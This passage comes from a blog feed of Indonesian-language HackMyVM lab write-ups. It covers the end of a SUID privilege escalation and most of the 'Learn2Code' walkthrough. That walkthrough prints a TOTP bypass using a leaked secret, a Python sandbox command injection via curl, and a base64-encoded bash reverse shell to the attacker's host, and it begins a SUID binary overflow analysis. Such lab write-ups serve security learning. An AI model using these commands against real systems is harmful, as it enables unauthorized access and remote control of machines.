-rwsr-sr-x 1 suidy theuser  16664 Nov  4 15:13 suidyyyyy
</code></pre></div></div>
<p>in other words, i be waiting for the time with <code class="language-plaintext highlighter-rouge">pspy64</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2022/11/04 13:47:29 CMD: UID=0    PID=101    | 
2022/11/04 13:47:29 CMD: UID=0    PID=100    | 
2022/11/04 13:47:29 CMD: UID=0    PID=10     | 
2022/11/04 13:47:29 CMD: UID=0    PID=1      | /sbin/init 
2022/11/04 13:47:52 CMD: UID=1004 PID=14068  | -bash 
2022/11/04 13:47:57 CMD: UID=0    PID=14069  | 
2022/11/04 13:48:01 CMD: UID=0    PID=14070  | /usr/sbin/CRON -f 
2022/11/04 13:48:01 CMD: UID=0    PID=14071  | /usr/sbin/CRON -f 
2022/11/04 13:48:01 CMD: UID=0    PID=14072  | /bin/sh -c sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14073  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14074  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14075  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14076  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14077  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14078  | sh /root/script.sh 
</code></pre></div></div>
<p>Wooopppp.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>suidy@suidyrevenge:/home/suidy$ ls -la | grep "suidyyyyy"
-rwsrws--- 1 root  theuser  16712 Nov  4 15:14 suidyyyyy
</code></pre></div></div>
<p>tinggal execute aja ma brother.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>suidy@suidyrevenge:/home/suidy$ ./suidyyyyy 
root@suidyrevenge:/home/suidy# ls -la /root
total 56
drwx------  3 root root  4096 Oct  2  2020 .
drwxr-xr-x 18 root root  4096 Oct  1  2020 ..
-rw-------  1 root root   127 Oct  2  2020 .bash_history
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root  4096 Oct  1  2020 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r-----  1 root root  1961 Oct  2  2020 root.txt
-rwxr-x--x  1 root root   517 Oct  1  2020 script.sh
-rw-r--r--  1 root root    66 Oct  1  2020 .selected_editor
-rwxr-xr-x  1 root root 16712 Oct  2  2020 suidyyyyy
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</a></li>
</ul>]]></content><author><name></name></author><category term="hackmyvm" /><category term="RCE" /><category term="hydra" /><category term="ssh" /><category term="SUID" /><summary type="html"><![CDATA[Hello, this is small things iâ€™ve been doing lately because of getting bored. kukira susah karena difficulty-nya. ya, cuma buka scan nmap terus crawling semua text, masuk ke hydra untuk bruteforce lalu dapet credentials-nya dan masuk lewat ssh. dan ya biasanya lagi, jalanin linpeas dan dapet suid binary yang sebelumnya ada note.txt tertulis kalo root bakal autorun sebuah script untuk ganti owner dan beri akses suid dan boom rooted.]]></summary></entry><entry><title type="html">HackMyVM: Learn2Code</title><link href="http://localhost:4000/hmv-learn2code" rel="alternate" type="text/html" title="HackMyVM: Learn2Code" /><published>2022-10-15T00:00:00+07:00</published><updated>2022-10-15T00:00:00+07:00</updated><id>http://localhost:4000/hmv-learn2code</id><content type="html" xml:base="http://localhost:4000/hmv-learn2code"><![CDATA[<p>Mesin dengan tingkat kesulitan <strong>Medium</strong> dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan <em>pwn</em> hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!</p>

<h2 id="reconnaissance">Reconnaissance</h2>

<p>Saved as variable.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>victim=192.168.56.27
</code></pre></div></div>

<h2 id="nmap-scanning">Nmap Scanning</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.92 scan initiated Sat Oct  8 13:38:51 2022 as: nmap -vvv -p 80 -sCV -A -oN scan_tcp 192.168.56.27</span>
Nmap scan report <span class="k">for </span>192.168.56.27
Host is up, received syn-ack <span class="o">(</span>0.00043s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-10-08 13:39:00 WIB <span class="k">for </span>6s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
|_http-title: Access system
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sat Oct  8 13:39:06 2022 -- 1 IP address (1 host up) scanned in 14.80 seconds</span>

</code></pre></div></div>
<p>Port hanya 80 saja? tidak ada yang lain? Apache? Oke.</p>

<h2 id="80---static-web">80 - static web</h2>

<p><img src="https://i.postimg.cc/sfm6d9G9/image.png" alt="image123213" /></p>

<p>Dari sini saya berpikir untuk fuzzing codenya dengan mengirimkan data menggunakan metode POST request lalu menggunakan wordlist 6 digit dari <em>SecLists</em>. Dan saya berpikir akan kena dan langsung login tapi ternyata itu hanya membuang waktu saja.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ wfuzz <span class="nt">-w</span> /opt/SecLists/Fuzzing/6-digits-000000-999999.txt <span class="nt">-d</span> <span class="s2">"action=check_code&amp;code=FUZZ"</span> <span class="nt">-u</span> http://<span class="nv">$victim</span>/ <span class="nt">--hl</span> 32

</code></pre></div></div>
<p><img width="400" src="https://i0.kym-cdn.com/photos/images/facebook/000/029/118/29bc5tl.png" /></p>

<h2 id="whatweb-results">Whatweb results</h2>

<p><img src="https://i.postimg.cc/CM6nD3pB/image.png" alt="image" /></p>

<p>JQuery? menarik.</p>

<h2 id="nikto-results">Nikto results</h2>

<p><img src="https://i.postimg.cc/pdhRw617/image.png" alt="image2" /></p>

<p>ada directory indexing, apache default file. hmm menarik semua.</p>

<p>sebenarnya saya sempat scanning dengan <strong>wapiti</strong> tetapi tidak ada result yang menarik untuk diulas. dan juga saya sempat menjalankan <strong>gobuster</strong> untuk bruteforcing atau fuzzing directory tapi ternyata output yang ditampilkan sama saja seperti <strong>nikto</strong>.</p>

<h2 id="directory-listing">directory listing</h2>

<p>di sini ada 3 folder, tetapi yang membuat saya tertarik itu ada 2 dan yang paling utama ialah folder <em>PHP</em>.</p>

<p><img src="https://i.postimg.cc/gjkZHpNQ/image.png" alt="image3" /></p>

<h2 id="exploiting">exploiting</h2>

<p>karena biasanya di bagian folder PHP ini bisa dapat banyak vulnerability yang bisa diinjeksi (menurut pengalaman) dan ditesting untuk masuk ke revshell ataupun bisa di-abuse seperti mendapatkan cookies untuk login, atau menambahkan RCE, dan semacamnya. Tapi kali ini jalan yang saya tempuh sedikit berbeda.</p>

<p><img src="https://i.postimg.cc/QxC6XZhf/image.png" alt="image4" /></p>

<p>well, <strong>GoogleAuthenticator.php</strong> itu ketika saya cari ternyata filenya ada <em>source code</em> di <a href="https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php">github</a>. nanti akan saya tamapakkan beberapa fungsi yang penting untuk dibahas.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/learn2code]
â•°â”€î˜‚ cat access.php.bak
<span class="cp">&lt;?php</span>
        <span class="k">require_once</span> <span class="s1">'GoogleAuthenticator.php'</span><span class="p">;</span>
        <span class="nv">$ga</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPGangsta_GoogleAuthenticator</span><span class="p">();</span>
        <span class="nv">$secret</span> <span class="o">=</span> <span class="s2">"S4I22IG3KHZIGQCJ"</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'check_code'</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'code'</span><span class="p">];</span>
                <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$ga</span><span class="o">-&gt;</span><span class="nf">verifyCode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">,</span> <span class="nv">$code</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">include</span><span class="p">(</span><span class="s1">'coder.php'</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s2">"wrong"</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
<span class="cp">?&gt;</span>%

</code></pre></div></div>
<p>Dari sini, sudah mengindikasikan bahwa kita harus mencari <em>parameter</em> untuk variable <em>$code</em> dengan metode POST request sebagai <em>argument included</em>. jadi mau tidak mau harus membuat beberapa modifikasi dari fungsi orisinilnya seperti di bawah ini.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/learn2code]
â•°â”€î˜‚ cat testing.php
<span class="cp">&lt;?php</span>
  <span class="k">require_once</span> <span class="s1">'GoogleAuthenticator.php'</span><span class="p">;</span>
  <span class="nv">$ga</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPGangsta_GoogleAuthenticator</span><span class="p">();</span>

  <span class="nv">$secret</span> <span class="o">=</span> <span class="s2">"S4I22IG3KHZIGQCJ"</span><span class="p">;</span>
  <span class="nv">$kodeNyaAnjing</span> <span class="o">=</span> <span class="nv">$ga</span><span class="o">-&gt;</span><span class="nf">getCode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">);</span>
  <span class="nv">$checkResult</span> <span class="o">=</span> <span class="nv">$ga</span><span class="o">-&gt;</span><span class="nf">verifyCode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">,</span> <span class="nv">$kodeNyaAnjing</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$checkResult</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$kodeNyaAnjing</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'failed'</span><span class="p">;</span> <span class="c1"># code...</span>
  <span class="p">}</span>

<span class="cp">?&gt;</span>

</code></pre></div></div>
<p>lalu saat saya jalankan, dan yap tinggal masukkan saja.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ php testing.php
991873%
</code></pre></div></div>
<h2 id="shell-as-www-data">shell as www-data</h2>

<p>Jadi ga tau kenapa saat saya ingin melihat responsive websitenya kembali dan memasukkan <em>generated code</em> tersebut malah ga masuk-masuk, jadi saya menggunakan CLI untuk testing dan nanti saya akan menggunakan cookies sebagai pengganti <em>request data</em> agar tetap saved login.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ php testing.php
772367%
â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ curl <span class="nt">-vX</span> POST <span class="s1">'http://192.168.56.27/includes/php/access.php'</span> <span class="nt">-d</span> <span class="s1">'action=check_code&amp;code=772367'</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 192.168.56.27:80...
<span class="k">*</span> Connected to 192.168.56.27 <span class="o">(</span>192.168.56.27<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> POST /includes/php/access.php HTTP/1.1
<span class="o">&gt;</span> Host: 192.168.56.27
<span class="o">&gt;</span> User-Agent: curl/7.85.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Content-Length: 29
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Date: Sat, 15 Oct 2022 09:20:07 GMT
&lt; Server: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
&lt; Set-Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>n6jrt811hte6ni7hetvj4vh6kp<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Vary: Accept-Encoding
&lt; Content-Length: 1543
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt;
                &lt;<span class="o">!</span>DOCTYPE html&gt;
                &lt;HTML&gt;
                        &lt;<span class="nb">head</span><span class="o">&gt;</span>
                                &lt;title&gt;Coding practise&lt;/title&gt;

                                &lt;<span class="o">!</span><span class="nt">--</span> Configurations <span class="nt">--</span><span class="o">&gt;</span>
                                &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
                                &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=edge"</span><span class="o">&gt;</span>
                                &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>

                                &lt;<span class="o">!</span><span class="nt">--</span> Styles <span class="nt">--</span><span class="o">&gt;</span>
                                &lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"../includes/css/style.css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>
                                &lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"../includes/css/bootstrap.min.css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>

                                &lt;<span class="o">!</span><span class="nt">--</span> JavaScript <span class="nt">--</span><span class="o">&gt;</span>
                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/jquery-3.4.1.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;
                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/bootstrap.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;
                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/custom_lib.js"</span><span class="o">&gt;</span>&lt;/script&gt;
                                &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"../includes/js/functions.js"</span><span class="o">&gt;</span>&lt;/script&gt;
                        &lt;/head&gt;
                        &lt;body&gt;
                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row d-flex justify-content-center h-100"</span><span class="o">&gt;</span>
                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-md-6 boxWrap"</span><span class="o">&gt;</span>
                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
                                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
                                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-12"</span><span class="o">&gt;</span>
                                                                                &lt;label <span class="k">for</span><span class="o">=</span><span class="s2">"custom_code"</span><span class="o">&gt;</span>Type your code:&lt;/label&gt;
                                                                                &lt;textarea <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control custom-code"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"custom_code"</span> <span class="nv">rows</span><span class="o">=</span><span class="s2">"10"</span><span class="o">&gt;</span>&lt;/textarea&gt;
                                                                        &lt;/div&gt;
                                                                &lt;/div&gt;
                                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
                                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-12"</span><span class="o">&gt;</span>
                                                                                &lt;button <span class="nb">type</span><span class="o">=</span><span class="s2">"button"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"btn btn-primary btn-block"</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">"run_code();"</span><span class="o">&gt;</span>Run code&lt;/button&gt;
                                                                        &lt;/div&gt;
                                                                &lt;/div&gt;
                                                                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
                                                                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-12"</span><span class="o">&gt;</span>
                                                                                &lt;textarea <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control response-code"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"response_code"</span> <span class="nv">rows</span><span class="o">=</span><span class="s2">"10"</span> disabled&gt;&lt;/textarea&gt;
                                                                        &lt;/div&gt;
                                                                &lt;/div&gt;
                                                        &lt;/div&gt;
                                                &lt;/div&gt;
                                        &lt;/div&gt;
                                &lt;/div&gt;
                        &lt;/body&gt;
                &lt;/HTML&gt;
<span class="k">*</span> Connection <span class="c">#0 to host 192.168.56.27 left intact</span>
     
</code></pre></div></div>
<p>saya ulangi lagi dan mencoba untuk memasukkan ini ke dalam request data dengan POST method untuk dikirimkan ke url <strong>/includes/php/access.php</strong>. dan mengambil cookiesnya untuk injeksi <em>python sandboxes</em> yang terdapat pada situs tersebut.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/learn2code]
â•°â”€î˜‚ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&amp;code=__import__('os').system('ls')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"
GoogleAuthenticator.php
access.php
access.php.bak
coder.php
runcode.php
â•­â”€ via [machines/learn2code]
â•°â”€î˜‚ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&amp;code=__import__('os').system('id')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

</code></pre></div></div>
<p>seperti biasa kalo sudah seperti ini saya pasti waktunya untuk memasukkan <em>reverse shell</em> !!</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ <span class="nb">echo</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/12345 0&gt;&amp;1"</span> | <span class="nb">base64</span> | cboard
â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ curl <span class="nt">-sX</span> POST <span class="s1">'http://192.168.56.27/includes/php/runcode.php'</span> <span class="nt">-d</span> <span class="s2">"action=run_code&amp;code=__import__('os').system('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg== | base64 -d | bash')"</span> <span class="nt">-b</span> <span class="s2">"PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"</span>

</code></pre></div></div>
<p><img src="https://i.postimg.cc/0QqDXQYH/image.png" alt="image7" /></p>

<h2 id="binary-analyzing">binary analyzing</h2>

<p>kalau sudah masuk biasanya saya mencari versi kernel, jaringan network untuk melihat port apa saja yang sedang <em>listened</em> atau <em>open</em>, atau melihat <strong>SUID</strong> binary yang bisa digunakan untuk injeksi dan kebetulan saya tidak kepikiran untuk menyalakan <strong>LinPEAS</strong> karena terlalu fokus dan sangat tertarik.</p>

<p><img src="https://i.postimg.cc/qRd8RL77/image.png" alt="image9" /></p>

<p>terdapat binary <strong>MakeMeLearner</strong> sebagai tersangka pertama. wait-wait-wait ketika saya eksekusi ia membutuh kan argumen, wow. ketika saya test untuk melihat <em>man help</em>-nya ternyata ini termasuk binary ELF.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>/usr/bin/MakeMeLearner
/usr/bin/MakeMeLearner
MakeMeLearner: please specify an argument
www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>/usr/bin/MakeMeLearner <span class="nt">-h</span>
/usr/bin/MakeMeLearner <span class="nt">-h</span>
Change the <span class="s1">'modified'</span> variable value to <span class="s1">'0x61626364'</span> to be a learnerTry again, you got 0x00000000
www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>file /usr/bin/MakeMeLearner
file /usr/bin/MakeMeLearner
/usr/bin/MakeMeLearner: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
</code></pre></div></div>
<p>kalau sudah seperti ini, saya harus memindahkan executable ini ke mesin local saya agar bisa saya debugging dan decompile dan melihat bagaimana executable ini berjalan.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span><span class="nb">cp</span> /usr/bin/MakeMeLearner /dev/shm/.
&lt;/includes/php<span class="nv">$ </span><span class="nb">cp</span> /usr/bin/MakeMeLearner /dev/shm/.
www-data@Learn2Code:/var/www/html/includes/php<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server <span class="nt">-d</span> /dev/shm/
&lt;l/includes/php<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server <span class="nt">-d</span> /dev/shm/
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
192.168.56.1 - - <span class="o">[</span>15/Oct/2022 16:45:30] <span class="s2">"GET /MakeMeLearner HTTP/1.1"</span> 200 -

<span class="nt">---local</span> machine---

â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ wget http://<span class="nv">$victim</span>:8000/MakeMeLearner
<span class="nt">--2022-10-15</span> 16:44:02--  http://192.168.56.27:8000/MakeMeLearner
Connecting to 192.168.56.27:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16864 <span class="o">(</span>16K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: â€˜MakeMeLearnerâ€™

MakeMeLearner                       100%[<span class="o">=================================================================&gt;]</span>  16.47K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2022-10-15 16:44:02 <span class="o">(</span>32.6 MB/s<span class="o">)</span> - â€˜MakeMeLearnerâ€™ saved <span class="o">[</span>16864/16864]
</code></pre></div></div>

<p>Yeah, sebelum itu saya lihat dulu kondisi strings dan imported simbols dari libraries yang dipakai pada executable ini.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ strings MakeMeLearner
/lib64/ld-linux-x86-64.so.2
setuid
strcpy
<span class="nb">printf
</span>system
__cxa_finalize
errx
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
<span class="o">=</span>dcbau<span class="s2">"
[]A</span><span class="se">\A</span><span class="s2">]A^A_
please specify an argument
Change the 'modified' variable value to '0x61626364' to be a learner
/bin/bash
Try again, you got 0x%08x
;*3$"</span>
GCC: <span class="o">(</span>Debian 9.3.0-15<span class="o">)</span> 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7452
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
errx@@GLIBC_2.2.5
system@@GLIBC_2.2.5
<span class="nb">printf</span>@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

</code></pre></div></div>
<p>terdapat string menarik seperti di bawah ini, saya yakin 4 awal kata di bawah adalah sebuah fungsi dan seterusnya itu adalah string yang mungkin sangat berguna untuk ditelisik lagi.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setuid
strcpy
printf
system

=dcbau"
[]A\A]A^A_
please specify an argument
Change the 'modified' variable value to '0x61626364' to be a learner
/bin/bash
Try again, you got 0x%08x
;*3$"
</code></pre></div></div>
<p>karena saya adalah manusia modern maka saya ingin kepastian yang lebih akurat lagi, jadi saya menjalankan <code class="language-plaintext highlighter-rouge">rabin2</code> untuk melihat lebih banyak informasi lagi terkait <em>executable</em> ini.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/learn2code]
â•°â”€î˜‚ rabin2 <span class="nt">-zi</span> MakeMeLearner
<span class="o">[</span>Imports]
nth vaddr      <span class="nb">bind   type   </span>lib name
â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•
1   0x00000000 WEAK   NOTYPE     _ITM_deregisterTMCloneTable
2   0x00001030 GLOBAL FUNC       strcpy
3   0x00001040 GLOBAL FUNC       errx
4   0x00001050 GLOBAL FUNC       system
5   0x00001060 GLOBAL FUNC       <span class="nb">printf
</span>6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x00001070 GLOBAL FUNC       setgid
9   0x00000000 WEAK   NOTYPE     _ITM_registerTMCloneTable
10  0x00001080 GLOBAL FUNC       setuid
11  0x00001090 WEAK   FUNC       __cxa_finalize

<span class="o">[</span>Strings]
nth paddr      vaddr      len size section <span class="nb">type  </span>string
â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•
0   0x00002008 0x00002008 27  28   .rodata ascii please specify an argument<span class="se">\n</span>
1   0x00002028 0x00002028 68  69   .rodata ascii Change the <span class="s1">'modified'</span> variable value to <span class="s1">'0x61626364'</span> to be a learner
2   0x0000206d 0x0000206d 9   10   .rodata ascii /bin/bash
3   0x00002077 0x00002077 26  27   .rodata ascii Try again, you got 0x%08x<span class="se">\n</span>

</code></pre></div></div>

<p>dari sini bisa ditarik sebuah kesimpulan bahwa ini semacam <code class="language-plaintext highlighter-rouge">stack-based overflow</code> yang paling dasar karena terdapat keanehan pada address <code class="language-plaintext highlighter-rouge">0x00002028</code> dan <code class="language-plaintext highlighter-rouge">0x00002077</code> yang mana saya melihat dari keduanya terjadi karena suatu <strong>conditional expression</strong>.</p>

<p>-</p>

<p>saya menganalisis bahwa <code class="language-plaintext highlighter-rouge">modified</code> adalah <strong>variable</strong> yang entah nilainya berapa dan harus digantikan dengan nilai <code class="language-plaintext highlighter-rouge">0x61626364</code> yang mana hasil stringnya adalah <code class="language-plaintext highlighter-rouge">dcba</code> dan jika hasilnya bisa mencapai nilai string tersebut maka kita akan dibawa elevasi ke user yaitu <code class="language-plaintext highlighter-rouge">learner</code> dengan rumusnya harus bisa mendekati <code class="language-plaintext highlighter-rouge">setuid</code> dan <code class="language-plaintext highlighter-rouge">setgid</code> untuk mengeksekusi shell <code class="language-plaintext highlighter-rouge">0x0000206d</code> dengan string <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</p>

<p>-</p>

<p>cukup ribet sih kalau ingin dijelaskan.</p>

<p>tapi sebelum itu saya memastikan apakah learner adalah seorang user?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/var/www/html/includes/php$ grep -i sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
